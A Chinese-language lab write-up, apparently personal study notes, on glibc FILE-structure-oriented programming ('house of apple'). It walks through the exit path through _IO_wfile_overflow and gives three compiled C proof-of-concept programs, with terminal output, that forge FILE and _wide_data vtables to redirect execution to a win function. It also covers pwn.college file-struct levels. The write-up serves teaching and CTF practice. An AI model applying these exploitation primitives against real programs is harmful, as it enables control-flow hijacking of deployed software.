<p><strong>使得的<code>vtable</code>指向<code>_IO_wfile_jumps</code>,然后构造<code>wide_data</code>,并使其<code>wide_vtable</code>指向假的虚表,假表相应位置填充<code>win</code>函数地址</strong></p>
<p><strong>然后将这个FILE挂到<code>_IO_list_all</code>链上</strong></p>
<p>就可以调用到<code>win</code>函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span></span><br><span class="line">	_run_exit_handlers</span><br><span class="line">		_IO_cleanup</span><br><span class="line">			_IO_flush_all</span><br><span class="line">				_IO_OVERFLOW</span><br><span class="line">					vtable + <span class="number">0x18</span> =&gt; _IO_wfile_overflow</span><br><span class="line">						_IO_wdoallocbuf</span><br><span class="line">							_IO_WDOALLOCATE</span><br><span class="line">    							wide_data.wide_vtable  + <span class="number">0x68</span> =&gt; win</span><br></pre></td></tr></table></figure>
<p>写一个poc意思意思</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fake_fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.</span></span><br><span class="line">    <span class="comment">//泄露libc基址,泄露IO_wfile_jumps地址,泄露IO_list_all地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_list_all_addr = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d74c0</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_list_all_addr = %p\n&quot;</span>, IO_list_all_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.</span></span><br><span class="line">    <span class="comment">//构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.</span></span><br><span class="line">    <span class="comment">//构造fake_fp</span></span><br><span class="line">    fake_fp = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">memset</span>(fake_fp,<span class="number">0</span>,<span class="number">0x100</span>);</span><br><span class="line">    fake_fp -&gt; _flags =  ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>); </span><br><span class="line">    fake_fp -&gt; _mode = <span class="number">0</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fake_fp -&gt; _IO_write_base = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fake_fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_fp @ %p\n&quot;</span>, fake_fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;orignal _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">//5.fake_fp上链_IO_list_all</span></span><br><span class="line">    *IO_list_all_addr = fake_fp;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;new _IO_list_all points to %p\n&quot;</span>, *IO_list_all_addr);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.</span></span><br><span class="line">    <span class="comment">//return and trigger win</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop1.c -o fsop1 -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop1</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7fb0bbddc110</span><br><span class="line">libc_addr = 0x7fb0bbd88000</span><br><span class="line">IO_list_all_addr = 0x7fb0bbf5f4c0</span><br><span class="line">IO_wfile_jumps = 0x7fb0bbf5d268</span><br><span class="line">fake_fp @ 0x55fbae0cc8d0</span><br><span class="line">orignal _IO_list_all points to 0x7fb0bbf5f4e0</span><br><span class="line">new _IO_list_all points to 0x55fbae0cc8d0</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
<p>如果能够控制<code>fopen</code>并且不<code>fclose</code>关闭资源则更简单,</p>
<p><code>fopen</code>会自动让假<code>fp</code>上链,</p>
<p>不<code>fclose</code>的话<code>fp</code>就不会下链,</p>
<p>因此此时程序退出,也可以触发</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function win called\n&quot;</span> );</span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    </span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span> * libc_addr;</span><br><span class="line">    <span class="type">size_t</span> * IO_list_all;</span><br><span class="line">    <span class="type">size_t</span> * IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span> * fake_wide_data;</span><br><span class="line">    <span class="type">size_t</span> * vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span> * wide_data_ptr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.泄露libc基地址,泄露IO_wfile_jumps地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf addr = %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;</span><br><span class="line">    IO_wfile_jumps = (<span class="type">char</span>*) libc_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;libc_addr = %p\n&quot;</span>, libc_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;IO_wfile_jumps = %p\n&quot;</span>, IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//2.构造fake_wide_vtable</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i] = win;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.构造fake_wide_data</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//4.fopen打开的FILE对象,会自动挂到IO_list_all上,省去了我们泄露IO_list_all并修改其值的步骤</span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> |<span class="number">0x2</span>);</span><br><span class="line">    fp-&gt;_mode = <span class="number">0</span>;</span><br><span class="line">    fp-&gt;_IO_write_ptr = <span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_base = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">//修改vtable和wide_data.wide_vtable</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = IO_wfile_jumps;</span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//fclose(fp);   如果fclose执行则fp会从IO_list_all中删除,因此不能执行</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.return and trigger win</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# gcc fsop.c -o fsop -w</span><br><span class="line"></span><br><span class="line">┌──(root㉿Destroyer)-[/mnt/c/Users/xidian/Desktop/pwncollege/file/test]</span><br><span class="line">└─# ./fsop</span><br><span class="line"><span class="keyword">function</span> <span class="built_in">printf</span> addr = 0x7f218fb94110</span><br><span class="line">libc_addr = 0x7f218fb40000</span><br><span class="line">IO_wfile_jumps = 0x7f218fd15268</span><br><span class="line"><span class="keyword">function</span> win called</span><br></pre></td></tr></table></figure>
<p>也可以通过修改<code>stdout-&gt;_chain</code>指向假<code>FILE</code>实现</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _NR_sysexit 0x3C</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;function win called&quot;</span>);</span><br><span class="line">    <span class="comment">// printf(&quot;function win called\n&quot; );</span></span><br><span class="line">    syscall(_NR_sysexit);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">size_t</span>* libc_base_addr;</span><br><span class="line">    <span class="type">size_t</span>* _IO_wfile_jumps;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_vtable;</span><br><span class="line">    <span class="type">size_t</span>* fake_wide_data;</span><br><span class="line"></span><br><span class="line">    FILE * fp;</span><br><span class="line">    <span class="type">size_t</span>* vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* vtable_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_data_addr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_ptr;</span><br><span class="line">    <span class="type">size_t</span>* wide_vtable_addr;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">100</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//0.泄露libc基地址,计算得到_IO_wfile_jumps表的地址</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;function printf @ %p\n&quot;</span>, <span class="built_in">printf</span>);</span><br><span class="line">    libc_base_addr = (<span class="type">char</span>*) <span class="built_in">printf</span> - <span class="number">0x54110</span>;     <span class="comment">// printf offset @ glibc-2.38</span></span><br><span class="line">    _IO_wfile_jumps = (<span class="type">char</span>*)libc_base_addr + <span class="number">0x1d5268</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;_IO_wfile_jumps @ %p\n&quot;</span>,_IO_wfile_jumps);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//1.构造fake_wide_vtable,使用win填充</span></span><br><span class="line">    fake_wide_vtable = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;++i)&#123;</span><br><span class="line">        fake_wide_vtable[i]=_IO_wfile_jumps[i];</span><br><span class="line">    &#125;</span><br><span class="line">    fake_wide_vtable[<span class="number">13</span>] = (<span class="type">size_t</span>)win;</span><br><span class="line">    <span class="comment">//2.构造fake_wide_data,使得其偏移0xe0处的_wide_vtable指针,指向1中构造的fake_wide_vtable</span></span><br><span class="line">    fake_wide_data = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    fake_wide_data[<span class="number">28</span>] = fake_wide_vtable;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//3.修改FILE.flag |= ~(_IO_CURRENTLY_PUTTING | _IO_NO_WRITES | _IO_UNBUFFERED) </span></span><br><span class="line">    fp = fopen(<span class="string">&quot;./flag&quot;</span>,<span class="string">&quot;w&quot;</span>);</span><br><span class="line">    fp-&gt;_flags |= ~(<span class="number">0x800</span> | <span class="number">0x8</span> | <span class="number">2</span>);</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_ptr =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_read_end =0;</span></span><br><span class="line">    fp-&gt;_IO_write_ptr =<span class="number">1</span>;</span><br><span class="line">    fp-&gt;_IO_write_end =<span class="number">0</span>;</span><br><span class="line">    fp-&gt;_mode=<span class="number">0</span>;</span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_buf_end =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_backup_base =0;</span></span><br><span class="line">    <span class="comment">// fp-&gt;_IO_save_end =0;</span></span><br><span class="line">    <span class="comment">//4.修改FILE.vtable指向3中泄露的_IO_wfile_jumps</span></span><br><span class="line">    vtable_ptr = (<span class="type">char</span>*)fp + <span class="number">0xd8</span>;</span><br><span class="line">    *vtable_ptr = _IO_wfile_jumps;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//5.修改FILE._wide_data指向2中构造的fake_wide_data</span></span><br><span class="line">    wide_data_ptr = (<span class="type">char</span>*)fp + <span class="number">0xa0</span>;</span><br><span class="line">    *wide_data_ptr = fake_wide_data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.通过沾stdout亲带故上链</span></span><br><span class="line">    <span class="built_in">stdout</span>-&gt;_chain = fp;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//6.trigger house of apple</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="pwn.college"><a
target="_blank" rel="noopener" href="https://pwn.college/software-exploitation/file-struct-exploits/">pwn.college</a></h2>
<h3 id="level1">level1</h3>
<p>篡改位于堆上的<code>FILE</code>结构,使其文件描述符<code>fileno</code>为1,也就是到标准输出</p>
<p>使其缓冲区位于泄露地址上</p>
<p>举一个例子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> flag[]=<span class="string">&quot;flag&#123;secret&#125;&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag @ %p\n&quot;</span>,flag);			<span class="comment">//泄露flag地址</span></span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">0x100</span>];</span><br><span class="line">    FILE *fp = fopen(<span class="string">&quot;./flag&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>,fp,<span class="number">480</span>);</span><br><span class="line">    fwrite(buffer,<span class="number">1</span>,<span class="number">0x100</span>,fp);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="level7">level7</h3>
<p><code>level7</code>题目中给的提示是这样的:</p>
<blockquote>
<p>This can be done by creating a fake _wide_data struct which will not
have a security check on the vtable.</p>
</blockquote>
<p>意思是篡改<code>_wide_data.vtable</code>指针不会被检查</p>
<p>在一个<code>FILE</code>结构体中,理论上有两个<code>vtable</code>指针,一个<code>_IO_FILE_plus + 0xd8</code>处的<code>vtable</code>指针</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x00d8 */</span>    FILE file;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  224 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>还有一个在<code>_IO_FILE._wide_data._wide_vtable</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">_IO_FILE + 0xa0    =&gt;  _wide_data</span><br><span class="line">_wide_data + 0xe0  =&gt;  _wide_vtable</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; ptype/xo <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span></span></span><br><span class="line"><span class="class">/* <span class="title">offset</span>      |    <span class="title">size</span> */  <span class="title">type</span> =</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0000      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_ptr;</span><br><span class="line"><span class="comment">/* 0x0008      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_end;</span><br><span class="line"><span class="comment">/* 0x0010      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_read_base;</span><br><span class="line"><span class="comment">/* 0x0018      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_base;</span><br><span class="line"><span class="comment">/* 0x0020      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_ptr;</span><br><span class="line"><span class="comment">/* 0x0028      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_write_end;</span><br><span class="line"><span class="comment">/* 0x0030      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_base;</span><br><span class="line"><span class="comment">/* 0x0038      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_buf_end;</span><br><span class="line"><span class="comment">/* 0x0040      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_base;</span><br><span class="line"><span class="comment">/* 0x0048      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_backup_base;</span><br><span class="line"><span class="comment">/* 0x0050      |  0x0008 */</span>    <span class="type">wchar_t</span> *_IO_save_end;</span><br><span class="line"><span class="comment">/* 0x0058      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_state;</span><br><span class="line"><span class="comment">/* 0x0060      |  0x0008 */</span>    <span class="type">__mbstate_t</span> _IO_last_state;</span><br><span class="line"><span class="comment">/* 0x0068      |  0x0070 */</span>    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> &#123;</span></span><br><span class="line"><span class="comment">/* 0x0068      |  0x0038 */</span>        _IO_iconv_t __cd_in;</span><br><span class="line"><span class="comment">/* 0x00a0      |  0x0038 */</span>        _IO_iconv_t __cd_out;</span><br><span class="line"></span><br><span class="line">                                   <span class="comment">/* total size (bytes):  112 */</span></span><br><span class="line">                               &#125; _codecvt;</span><br><span class="line"><span class="comment">/* 0x00d8      |  0x0004 */</span>    <span class="type">wchar_t</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"><span class="comment">/* XXX  4-byte hole      */</span></span><br><span class="line"><span class="comment">/* 0x00e0      |  0x0008 */</span>    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *_<span class="title">wide_vtable</span>;</span></span><br><span class="line"></span><br><span class="line">                               <span class="comment">/* total size (bytes):  232 */</span></span><br><span class="line">                             &#125;</span><br></pre></td></tr></table></figure>
<p>既然<code>_IO_FILE</code>本身就自带一个<code>vtable</code>,那么<code>level7</code>为何还要多此一举去改<code>_IO_FILE._wide_data._wide_vtable</code>?</p>
<p>因为<code>pwncollege</code>提供的靶场环境中使用的<code>libc</code>版本是<code>Ubuntu GLIBC 2.31-0ubuntu9.16</code></p>
<p>在<code>Glibc 2.23</code>之前是可以直接修改<code>_IO_FILE.vtable</code>指针的,
相关攻击方式被称为<code>house of orange</code>,</p>
